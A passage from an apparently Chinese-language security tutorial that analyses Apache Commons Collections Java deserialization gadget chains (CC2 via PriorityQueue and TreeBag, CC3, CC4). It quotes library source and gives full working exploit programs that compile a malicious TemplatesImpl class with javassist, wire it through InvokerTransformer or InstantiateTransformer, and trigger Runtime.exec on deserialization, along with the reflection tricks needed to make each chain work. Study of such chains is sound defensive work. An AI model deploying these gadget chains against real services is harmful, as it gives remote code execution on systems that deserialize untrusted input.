this.iParamTypes = paramTypes; this.iArgs = args; } /** * Transforms the input to result by invoking a method on the input. * * @param input the input object to transform * @return the transformed result, null if null input */ public Object transform(Object input) { if (input == null) { return null; } try { Class cls = input.getClass();//1 Method method = cls.getMethod(iMethodName, iParamTypes);//2 return method.invoke(input, iArgs);//3 } catch (NoSuchMethodException ex) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; does not exist\u0026#34;); } catch (IllegalAccessException ex) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; cannot be accessed\u0026#34;); } catch (InvocationTargetException ex) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; threw an exception\u0026#34;, ex); } } 前文提到过，CommonCollections2的思路是构造一个恶意类，并在该类中构造一个包含payload的static代码块，那么JVM加载该类时会执行这个静态的代码块，以此触发payload。\n那么注释1、2、3处就应该直接或间接实现该类的加载，或者创建类的实例的功能。\n在Exp中，此处先加载了TemplatesImpl类，利用TemplatesImpl类中的方法，实例化了我们构造的恶意类。\n此处，input是TemplatesImpl类的一个实例，iMethodName是newTransformer。\n接下来分析其中原理。\nTemplatesImpl 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 private String _name = null; private byte[][] _bytecodes = null; private Class[] _class = null; /** * Defines the translet class and auxiliary classes. * Returns a reference to the Class object that defines the main class */ private void defineTransletClasses() throws TransformerConfigurationException { if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount \u0026gt; 1) { _auxClasses = new HashMap\u0026lt;\u0026gt;(); } for (int i = 0; i \u0026lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]);//3 final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) { ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } catch (ClassFormatError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); } catch (LinkageError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } /** * This method generates an instance of the translet class that is * wrapped inside this Template. The translet instance will later * be wrapped inside a Transformer object. */ private Translet getTransletInstance() throws TransformerConfigurationException { try { if (_name == null) return null;//5 if (_class == null) defineTransletClasses();//2 // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();//4 translet.postInitialization(); translet.setTemplates(this); translet.setOverrideDefaultParser(_overrideDefaultParser); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) { translet.setAuxiliaryClasses(_auxClasses); } return translet; } catch (InstantiationException e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } catch (IllegalAccessException e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } /** * Implements JAXP\u0026#39;s Templates.newTransformer() * * @throws TransformerConfigurationException */ public synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory);//1 if (_uriResolver != null) { transformer.setURIResolver(_uriResolver); } if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) { transformer.setSecureProcessing(true); } return transformer; } 注释1处调用了getTransletInstance，分析getTransletInstance。\n注释2处调用了defineTransletClasses，在defineTransletClasses里注释3处，会解析类的字节码_bytecodes，_bytecodes就是之后我们构造的包含payload的类的字节码。\n回到注释4处，程序会为我们传入的恶意TemplatesImpl类创建一个实例，里面的静态代码包含的payload就会在此时执行。\nps1：\n在构造时我们还需要注意两点：\n注释4处，创建的是一个AbstractTranslet示例，因此我们的恶意类要继承一下AbstractTranslet 注释5处，我们构造时需要给_name赋一个任意的值，不然后面的代码不会执行 ps2：\nq：为什么不直接在InvokerTransformer#transform里调用getTransletInstance？\na：因为getTransletInstance是私有方法\n于是有Exp中的构造：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 String AbstractTranslet=\u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;; String TemplatesImpl=\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;; ClassPool classPool=ClassPool.getDefault();//返回默认的类池 classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径 CtClass payload=classPool.makeClass(\u0026#34;CommonsCollections22222222222\u0026#34;);//创建一个新的public类 payload.setSuperclass(classPool.get(AbstractTranslet)); //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet payload.makeClassInitializer().setBody(\u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);\u0026#34;); //创建一个空的类初始化，设置构造函数主体为runtime byte[] bytes=payload.toBytecode();//转换为byte数组 Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//反射创建TemplatesImpl Field field=templatesImpl.getClass().getDeclaredField(\u0026#34;_bytecodes\u0026#34;);//反射获取templatesImpl的_bytecodes字段 field.setAccessible(true);//暴力反射 field.set(templatesImpl,new byte[][]{bytes});//将templatesImpl上的_bytecodes字段设置为runtime的byte数组 Field field1=templatesImpl.getClass().getDeclaredField(\u0026#34;_name\u0026#34;);//反射获取templatesImpl的_name字段 field1.setAccessible(true);//暴力反射 field1.set(templatesImpl,\u0026#34;test\u0026#34;);//将templatesImpl上的_name字段设置为test ‍\nTransformingComparator 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 /** The decorated comparator. */ private final Comparator\u0026lt;O\u0026gt; decorated; /** The transformer being used. */ private final Transformer\u0026lt;? super I, ? extends O\u0026gt; transformer; public TransformingComparator(Transformer\u0026lt;? super I, ? extends O\u0026gt; transformer) { this(transformer, ComparatorUtils.NATURAL_COMPARATOR); } /** * Returns the result of comparing the values from the transform operation. * * @param obj1 the first object to transform then compare * @param obj2 the second object to transform then compare * @return negative if obj1 is less, positive if greater, zero if equal */ public int compare(final I obj1, final I obj2) { final O value1 = this.transformer.transform(obj1);//1 final O value2 = this.transformer.transform(obj2);//2 return this.decorated.compare(value1, value2); } commons-collections4 4.0中，LazyMap和TransformedMap没有了decorate方法，选择TransformingComparator的compare触发。\n在构造时，transformer传入的应该是InvokerTransformer实例。\nPriorityQueue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 private final Comparator\u0026lt;? super E\u0026gt; comparator; transient Object[] queue /** * Inserts item x at position k, maintaining heap invariant by * demoting x down the tree repeatedly until it is less than or * equal to its children or is a leaf. * * @param k the position to fill * @param x the item to insert */ private void siftDown(int k, E x) { if (comparator != null) siftDownUsingComparator(k, x);//2 else siftDownComparable(k, x); } @SuppressWarnings(\u0026#34;unchecked\u0026#34;) private void siftDownUsingComparator(int k, E x) { int half = size \u0026gt;\u0026gt;\u0026gt; 1; while (k \u0026lt; half) { int child = (k \u0026lt;\u0026lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right \u0026lt; size \u0026amp;\u0026amp; comparator.compare((E) c, (E) queue[right]) \u0026gt; 0)//1 c = queue[child = right]; if (comparator.compare(x, (E) c) \u0026lt;= 0) break; queue[k] = c; k = child; } queue[k] = x; } /** * Establishes the heap invariant (described above) in the entire tree, * assuming nothing about the order of the elements prior to the call. */ @SuppressWarnings(\u0026#34;unchecked\u0026#34;) private void heapify() { for (int i = (size \u0026gt;\u0026gt;\u0026gt; 1) - 1; i \u0026gt;= 0; i--) siftDown(i, (E) queue[i]);//3 } /** * Reconstitutes the {@code PriorityQueue} instance from a stream * (that is, deserializes it). * * @param s the stream */ private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size); queue = new Object[size]; // Read in all elements. for (int i = 0; i \u0026lt; size; i++) queue[i] = s.readObject(); // Elements are guaranteed to be in \u0026#34;proper order\u0026#34;, but the // spec has never explained what that might be. heapify();//4 } 阅读源码可知PriorityQueue在反序列化readObject时，会按照注释中4、3、2、1标注的顺序，维护一个桶排序树合法。\n接下来就是要如何构造comparator和queue了。\n根据注释1处，我们知道comparator应该是TransformingComparator的一个实例。\n根据TemplatesImpl和InvokerTransformer的分析，我们知道queue应该是TemplatesImpl实例数组。\n于是有Exp中的构造：\n1 2 3 4 5 6 7 8 9 10 11 12 13 InvokerTransformer transformer=new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,new Class[]{},new Object[]{}); TransformingComparator comparator =new TransformingComparator(transformer);//使用TransformingComparator修饰器传入transformer对象 PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。 queue.add(1);// queue.add(2);//占位用 Field field2=queue.getClass().getDeclaredField(\u0026#34;comparator\u0026#34;);//获取PriorityQueue的comparator字段 field2.setAccessible(true);//暴力反射 field2.set(queue,comparator);//设置queue的comparator字段值为comparator Field field3=queue.getClass().getDeclaredField(\u0026#34;queue\u0026#34;);//获取queue的queue字段 field3.setAccessible(true);//暴力反射 field3.set(queue,new Object[]{templatesImpl,templatesImpl});//设置queue的queue字段内容Object数组，内容为templatesImpl 问题补充 queue占位 Q1：\n1 2 3 PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。 queue.add(1);//1 queue.add(2);//2 注释1、2处，为何需要这两行代码？\nA1：\n我们看PriorityQueue的readObject函数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size); queue = new Object[size]; // Read in all elements. for (int i = 0; i \u0026lt; size; i++) queue[i] = s.readObject(); // Elements are guaranteed to be in \u0026#34;proper order\u0026#34;, but the // spec has never explained what that might be. heapify(); } 若无这两行代码，则创建的queue的size属性为0。\n这会导致反序列化时queue为空。\n因此Exp也可以改为：\n1 2 3 4 PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。 Field field4=queue.getClass().getDeclaredField(\u0026#34;size\u0026#34;);//获取PriorityQueue的size字段 field4.setAccessible(true);//暴力反射 field4.set(queue,2);//设置queue的comparator字段值为comparator Q2：\n为何要用1、2占位，不能直接addtemplatesImpl​？\nA2:\n因为会报错：\n​com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl cannot be cast to java.lang.Comparable​\n而利用反射时\n1 2 3 Field field3=queue.getClass().getDeclaredField(\u0026#34;queue\u0026#34;);//获取queue的queue字段 field3.setAccessible(true);//暴力反射 field3.set(queue,new Object[]{templatesImpl,templatesImpl});//设置queue的queue字段内容Object数组，内容为templatesImpl Java并不会检查是否合法，而在反序列化时，由于payload执行早于排序，因此不影响。\nquenue反序列化 Q：\nPriorityQueue的queue已经使用transient关键字修饰，为什么还能从流中反序列化queue中的元素？\nA：\n序列化规范允许待序列化的类实现writeObject方法，实现对自己的成员控制权。\nTreeBag\u0026amp;TreeMap链 Exp展示 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.bag.TreeBag; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsCollections2T { public static void main(String[] args) throws Exception { String AbstractTranslet=\u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;; String TemplatesImpl=\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;; ClassPool classPool=ClassPool.getDefault();//返回默认的类池 classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径 CtClass payload=classPool.makeClass(\u0026#34;CommonsCollections22222222222\u0026#34;);//创建一个新的public类 payload.setSuperclass(classPool.get(AbstractTranslet)); //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet payload.makeClassInitializer().setBody(\u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);\u0026#34;); //创建一个空的类初始化，设置构造函数主体为runtime byte[] bytes=payload.toBytecode();//转换为byte数组 Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//反射创建TemplatesImpl Field field=templatesImpl.getClass().getDeclaredField(\u0026#34;_bytecodes\u0026#34;);//反射获取templatesImpl的_bytecodes字段 field.setAccessible(true);//暴力反射 field.set(templatesImpl,new byte[][]{bytes});//将templatesImpl上的_bytecodes字段设置为runtime的byte数组 Field field1=templatesImpl.getClass().getDeclaredField(\u0026#34;_name\u0026#34;);//反射获取templatesImpl的_name字段 field1.setAccessible(true);//暴力反射 field1.set(templatesImpl,\u0026#34;test\u0026#34;);//将templatesImpl上的_name字段设置为test InvokerTransformer transformer=new InvokerTransformer(\u0026#34;toString\u0026#34;,new Class[]{},new Object[]{}); TransformingComparator comparator =new TransformingComparator(transformer);//使用TransformingComparator修饰器传入transformer对象 TreeBag tb = new TreeBag(comparator); tb.add(templatesImpl); Field field2 = InvokerTransformer.class.getDeclaredField(\u0026#34;iMethodName\u0026#34;); field2.setAccessible(true); field2.set(transformer, \u0026#34;newTransformer\u0026#34;); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;test.out\u0026#34;)); outputStream.writeObject(tb); outputStream.close(); ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(\u0026#34;test.out\u0026#34;)); inputStream.readObject(); } } Exp构造分析 利用链展示 1 2 3 4 5 6 7 8 Gadget chain: ObjectInputStream.readObject() TreeBag.readObject() ... TransformingComparator.compare() InvokerTransformer.transform() Method.invoke() Runtime.exec() 主要分析一下TreeBag和PriorityQueue的不同。\nTreeBag 1 2 3 4 5 6 7 8 9 public TreeBag(Comparator\u0026lt;? super E\u0026gt; comparator) { super(new TreeMap(comparator));//1 } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { in.defaultReadObject(); Comparator\u0026lt;? super E\u0026gt; comp = (Comparator)in.readObject(); super.doReadObject(new TreeMap(comp), in);//2 } 如注释1处所示，TreeBag创建实例时，还会创建一个TreeMap实例，并且它的排序方法由我们定义。\n因此我们可以在Exp中创建TreeBag传入我们的恶意排序方法。\n如注释2处所示，TreeBag在反序列化时，我们构造的恶意排序方法同样也反序列化了。\n接着我们跟进一下注释2处的代码，AbstractMapBag.doReadObject()。\nAbstractMapBag 1 2 3 4 5 6 7 8 9 10 11 12 protected void doReadObject(Map\u0026lt;E, MutableInteger\u0026gt; map, ObjectInputStream in) throws IOException, ClassNotFoundException { this.map = map; int entrySize = in.readInt(); for(int i = 0; i \u0026lt; entrySize; ++i) { E obj = in.readObject(); int count = in.readInt(); map.put(obj, new MutableInteger(count));//1 this.size += count; } } 程序在注释1处执行了TreeMap.put()，我们看一下对应方法。\nTreeMap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 public V put(K key, V value) { Entry\u0026lt;K,V\u0026gt; t = root; if (t == null) { compare(key, key); // type (and possibly null) check root = new Entry\u0026lt;\u0026gt;(key, value, null); size = 1; modCount++; return null; } int cmp; Entry\u0026lt;K,V\u0026gt; parent; // split comparator and comparable paths Comparator\u0026lt;? super K\u0026gt; cpr = comparator; if (cpr != null) { do { parent = t; cmp = cpr.compare(key, t.key); if (cmp \u0026lt; 0) t = t.left; else if (cmp \u0026gt; 0) t = t.right; else return t.setValue(value); } while (t != null); } else { if (key == null) throw new NullPointerException(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) Comparable\u0026lt;? super K\u0026gt; k = (Comparable\u0026lt;? super K\u0026gt;) key; do { parent = t; cmp = k.compareTo(t.key); if (cmp \u0026lt; 0) t = t.left; else if (cmp \u0026gt; 0) t = t.right; else return t.setValue(value); } while (t != null); } Entry\u0026lt;K,V\u0026gt; e = new Entry\u0026lt;\u0026gt;(key, value, parent); if (cmp \u0026lt; 0) parent.left = e; else parent.right = e; fixAfterInsertion(e); size++; modCount++; return null; } 可以看到这里触发了我们构造的恶意排序方法。\n后面的流程则和PriorityQueue链相同，不再赘述。\n问题补充 用toString初始化 Q：\n为什么Exp中的InvokerTransformer transformer=new InvokerTransformer(\u0026quot;toString\u0026quot;,new Class[]{},new Object[]{});​不直接用InvokerTransformer transformer=new InvokerTransformer(\u0026quot;newTransformer\u0026quot;,new Class[]{},new Object[]{});​呢？\nA：\n我们构造的恶意排序方法其实是不能正常排序的，如果用newTransformer作为入参构造，则在Exp的tb.add(templatesImpl)​就会报错，原因看源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 //TreeBag源码 public boolean add(E object) { if (this.comparator() == null \u0026amp;\u0026amp; !(object instanceof Comparable)) { throw new IllegalArgumentException(\u0026#34;Objects of type \u0026#34; + object.getClass() + \u0026#34; cannot be added to \u0026#34; + \u0026#34;a naturally ordered TreeBag as it does not implement Comparable\u0026#34;); } else { return super.add(object); } } //AbstractTreeBag源码 public boolean add(E object) { return this.add(object, 1); } public boolean add(E object, int nCopies) { ++this.modCount; if (nCopies \u0026gt; 0) { MutableInteger mut = (MutableInteger)this.map.get(object); this.size += nCopies; if (mut == null) { this.map.put(object, new MutableInteger(nCopies)); return true; } else { mut.value += nCopies; return false; } } else { return false; } } 由源码可知，tb.add(templatesImpl)​会触发我们的恶意排序，如果用newTransformer作为入参构造，则此处报错。\n因此先使用toString作为入参构造，使代码运行通过tb.add(templatesImpl)​，后面再通过反射把toString改为newTransformer。\nnewTransformer构造报错原因 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 //TemplatesImpl源码 private Translet getTransletInstance() throws TransformerConfigurationException { try { if (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();//1 translet.postInitialization();//2 translet.setTemplates(this); translet.setOverrideDefaultParser(_overrideDefaultParser); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) { translet.setAuxiliaryClasses(_auxClasses); } return translet; } catch (InstantiationException e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } catch (IllegalAccessException e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } 程序在执行到注释1处时，触发了我们的恶意代码。\n而在注释2处发生了空指针报错：\n​​\nCommonsCollections3 版本适用范围 Commons-Collections 3.1-3.2.1\nJava JDK \u0026lt; 8u71\nExp展示 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.CannotCompileException; import javassist.ClassPool; import javassist.CtClass; import javassist.NotFoundException; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import java.io.*; import java.lang.reflect.*; import java.util.HashMap; import java.util.Map; public class CommonsCollections3 { public static void main(String[] args) throws Exception { String AbstractTranslet=\u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;; String TemplatesImpl=\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;; ClassPool classPool=ClassPool.getDefault(); classPool.appendClassPath(AbstractTranslet); CtClass payload=classPool.makeClass(\u0026#34;CommonsCollections333333333\u0026#34;); payload.setSuperclass(classPool.get(AbstractTranslet)); payload.makeClassInitializer().setBody(\u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);\u0026#34;); byte[] bytes=payload.toBytecode(); Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance(); Field field=templatesImpl.getClass().getDeclaredField(\u0026#34;_bytecodes\u0026#34;); field.setAccessible(true); field.set(templatesImpl,new byte[][]{bytes}); Field field1=templatesImpl.getClass().getDeclaredField(\u0026#34;_name\u0026#34;); field1.setAccessible(true); field1.set(templatesImpl,\u0026#34;test\u0026#34;); Transformer[] transformers=new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl}) }; ChainedTransformer chainedTransformer=new ChainedTransformer(transformers); Map map=new HashMap(); Map lazyMap= LazyMap.decorate(map,chainedTransformer); Class cls=Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor=cls.getDeclaredConstructor(Class.class,Map.class); constructor.setAccessible(true); InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Override.class,lazyMap); Map map1=(Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),invocationHandler); Object object=constructor.newInstance(Override.class,map1); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;test.out\u0026#34;)); outputStream.writeObject(object); outputStream.close(); ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(\u0026#34;test.out\u0026#34;)); inputStream.readObject(); } } Exp构造分析 CommonsCollections3是CommonsCollections1和CommonsCollections2的组合改造版。\n涉及的新类有InstantiateTransformer和TrAXFilter。\n利用链展示 1 2 3 4 5 6 7 8 AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform()//1 InstantiateTransformer.transform()//2 TemplatesImpl.newTransformer() 前半部分是CommonsCollections1的LazyMap利用链，后半部分是CommonsCollections2的利用链。\nTrAXFilter 在利用链注释1处会得到一个TrAXFilter类。\n1 2 3 4 5 6 public TrAXFilter(Templates templates) throws TransformerConfigurationException { this._templates = templates; this._transformer = (TransformerImpl)templates.newTransformer();//1 漏洞利用点 this._transformerHandler = new TransformerHandlerImpl(this._transformer); this._useServicesMechanism = this._transformer.useServicesMechnism(); } 根据ChainedTransformer.transform()的源码得知，这个类会作为InstantiateTransformer.transform()的入参。\nInstantiateTransformer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public Object transform(Object input) { try { if (!(input instanceof Class)) { throw new FunctorException(\u0026#34;InstantiateTransformer: Input object was not an instanceof Class, it was a \u0026#34; + (input == null ? \u0026#34;null object\u0026#34; : input.getClass().getName())); } else { Constructor con = ((Class)input).getConstructor(this.iParamTypes); return con.newInstance(this.iArgs);//1 漏洞利用点 } } catch (NoSuchMethodException var6) { throw new FunctorException(\u0026#34;InstantiateTransformer: The constructor must exist and be public \u0026#34;); } catch (InstantiationException var7) { throw new FunctorException(\u0026#34;InstantiateTransformer: InstantiationException\u0026#34;, var7); } catch (IllegalAccessException var8) { throw new FunctorException(\u0026#34;InstantiateTransformer: Constructor must be public\u0026#34;, var8); } catch (InvocationTargetException var9) { throw new FunctorException(\u0026#34;InstantiateTransformer: Constructor threw an exception\u0026#34;, var9); } } this.iArgs的值为我们构造的templatesImpl，程序在注释1出实际执行的是templatesImpl.newTransformer()，后面的利用原理和CommonsCollections2类似，不再赘述。\nCommonsCollections4 版本适用范围 commons-collections4 4.0\nExp展示 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.*; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsCollections4 { public static void main(String[] args) throws Exception { String AbstractTranslet=\u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;; String TemplatesImpl=\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;; ClassPool classPool=ClassPool.getDefault(); classPool.appendClassPath(AbstractTranslet); CtClass payload=classPool.makeClass(\u0026#34;CommonsCollections44444444\u0026#34;); payload.setSuperclass(classPool.get(AbstractTranslet)); payload.makeClassInitializer().setBody(\u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);\u0026#34;); byte[] bytes = payload.toBytecode(); Object templates = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance(); Field field=templates.getClass().getDeclaredField(\u0026#34;_bytecodes\u0026#34;); field.setAccessible(true); field.set(templates,new byte[][]{bytes}); Field name=templates.getClass().getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;test\u0026#34;); Transformer[] trans = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[]{Templates.class}, new Object[]{templates}) };// 主要是这里的变化 ChainedTransformer chain = new ChainedTransformer(trans); TransformingComparator transCom = new TransformingComparator(chain); PriorityQueue queue = new PriorityQueue(2); queue.add(1); queue.add(1); Field com = PriorityQueue.class.getDeclaredField(\u0026#34;comparator\u0026#34;); com.setAccessible(true); com.set(queue,transCom); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;test.out\u0026#34;)); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(\u0026#34;test.out\u0026#34;)); inputStream.readObject(); } } Exp构造分析 其实就是CommonsCollections2和CommonsCollections3的组合\n利用链展示 1 2 3 4 5 6 7 8 9 Gadget chain: ObjectInputStream.readObject() PriorityQueue.readObject() ... TransformingComparator.compare()//1 ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() TemplatesImpl.newTransformer() 注释1之前是CommonsCollections2的利用。\n在TransformingComparator.compare()中触发this.transformer.transform(obj1)，后面就是CommonsCollections3的利用。\n问题补充 是否能用TreeBag\u0026amp;TreeMap构造 Q：\n是否能类似CommonsCollections2一样，利用TreeBag\u0026amp;TreeMap构造呢？\nA：\n我觉得很难，理由如下：\n​tb.add(templatesImpl)​会触发我们的恶意排序。\n因此CommonsCollections2中，先使用toString作为入参构造，使代码运行通过tb.add(templatesImpl)​，后面再通过反射把toString改为newTransformer。\n而在此处却很难实现。\n我尝试不使用tb.add(templatesImpl)​，而使用反射给size和map赋值，这样可以规避add的执行，但可以把等同的状态赋给实例。\nsize容易解决，但是map却很难解决。\n源码中map的定义如下：\n​ private transient Map\u0026lt;E, MutableInteger\u0026gt; map;​\nMutableInteger是AbstractMapBag内部的一个protected类。\n1 2 3 4 5 6 7 8 9 10 11 12 